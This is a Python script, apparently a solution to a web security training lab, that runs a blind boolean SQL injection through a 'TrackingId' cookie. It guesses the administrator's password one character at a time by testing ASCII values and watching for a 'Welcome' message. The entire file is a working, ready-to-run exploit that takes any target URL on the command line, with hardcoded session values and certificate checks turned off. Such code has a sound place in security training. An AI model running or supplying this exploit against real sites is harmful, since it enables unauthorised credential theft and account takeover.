import requests
import sys
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extractor = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (SELECT ascii(substring(password,%s,1)) FROM users WHERE username = 'administrator')='%s'--" %(i,j)
            sqli_encoder = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId' : 'X3GPG5xZBJZ3u94c' + sqli_encoder, 'session' : 'ElrZ5orqam3yrKevvz0BcKfIEm588IsX' }
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extractor + chr(j))
                sys.stdout.flush()
            else:
                password_extractor += chr(j)
                sys.stdout.write('\r' + password_extractor)
                sys.stdout.flush()
                break
def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Retrieving adminstrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()

